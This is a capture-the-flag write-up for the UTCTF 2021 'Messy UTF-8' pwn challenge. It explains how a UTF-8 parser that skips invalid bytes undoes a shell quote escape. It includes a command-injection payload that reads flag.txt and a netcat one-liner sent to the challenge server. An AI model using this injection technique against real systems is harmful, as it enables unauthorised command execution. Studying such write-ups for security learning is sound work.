# Messy UTF-8 - UTCTF 2021 (pwn, 987p, 38 solved)

## Introduction
Messy UTF-8 is a binary exploitation task.

An x64 ELF binary is given. It waits for user input and echoes it back.

## Reverse engineering
The binary first starts by reading the user input in a buffer of size 100.
```c
char input[100];
fgets(input, 100, stdin);
```

It then calls the `escape` function on it and stores the output in a buffer of
size 400.
```c
char escaped[400];
escape(escaped, input);
```

The escape function replaces single quotes `'` with `'\''`. This is the classic
escape sequence for posix shells.
```c
void escape(char *out, char *in)
{
	while(*in) {
		if(*in == '\'') {
			out[0] = '\'';
			out[1] = '\\';
			out[2] = '\'';
			out[3] = '\'';
			out += 4;
		} else {
			out[0] = in[0];
			out += 1;
		}

		in++;
	}
}
```

The output is then concatenated between `echo '` and `'`.

The new string is altered by the `parseUTF8` function. This function looks for
invalid UTF-8 codepoints and skip them.

The final string is passed to `system`.

## Vulnerabilities
It is possible to abuse the `parseUTF8` function to skip characters.

Consider an input of `\xF0'; foobar #`. The `escape` pass will transform it to
`\xF0'\''; foobar #` and the concatenation part will transform it to
`echo '\xF0'\''; foobar #'`.

`parseUTF8` will see an invalid 4 bytes codepoint (`\xF0\x27\x5C\x27`) and skip
it entirely, transforming the string to `echo ''; foobar #'`.

## Exploitation
It is possible to read the `flag.txt` file with a payload of
`\xF0'; cat flag.txt #`

**Flag**: `utflag{shouldve_had_error_conditions871234}`

## Appendices
### pwn.sh
```sh
printf "\xF0'; ls -la; cat *flag* #\n" | nc pwn.utctf.live 5434
```
